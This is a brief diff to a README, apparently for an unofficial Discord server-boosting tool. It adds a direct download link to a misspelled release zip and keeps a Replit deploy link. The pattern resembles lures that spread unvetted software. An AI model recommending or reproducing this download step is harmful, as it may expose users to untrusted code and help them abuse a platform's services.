@@ -10,7 +10,7 @@
 </p>
 
 ## Download
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/yoepax/Discord-Server-Boost/releases/download/v2.6/Relase.zip)
 
 # [🌟 Deploy on Replit here 🌟](https://replit.com/@Bot-designerde1/Boost-Tool)
 
